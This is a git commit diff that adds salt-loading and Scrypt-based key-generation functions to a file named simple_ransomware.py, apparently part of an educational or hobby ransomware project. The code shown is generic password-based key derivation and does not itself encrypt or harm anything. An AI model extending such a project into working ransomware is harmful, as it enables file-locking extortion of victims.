bd9427651f6ce1933a9f28a59ee0c236beb68a2b
jroller33 <jtroller33@gmail.com>
2023-07-04 17:24:02 -0500

    generate_key

--- ransomware/simple_ransomware.py
+++ ransomware/simple_ransomware.py
@@ -31,3 +31,29 @@ def derive_key(salt, password):
     kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
 
     return kdf.derive(password.encode())
+
+
+# load salt from salt.salt file
+def load_salt():
+    return open("salt.salt", "rb").read()
+
+
+# generate a key from password and salt.
+def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
+    # if `load_existing_salt` is True, it'll load the salt from 'salt.salt' in current directory
+    # if `save_salt` is True, then it will generate a new salt and save it to "salt.salt" in current directory
+    
+    if load_existing_salt:
+        salt = load_salt()
+
+    # generate new salt and save it
+    elif save_salt:
+        salt = generate_salt(salt_size)
+        with open("salt.salt", "wb") as salt_file:
+            salt_file.write(salt)
+    
+    # generate the key from the salt and the password
+    derived_key = derive_key(salt, password)
+    
+    # encode the key with Base 64 and return it
+    return base64.urlsafe_b64encode(derived_key)
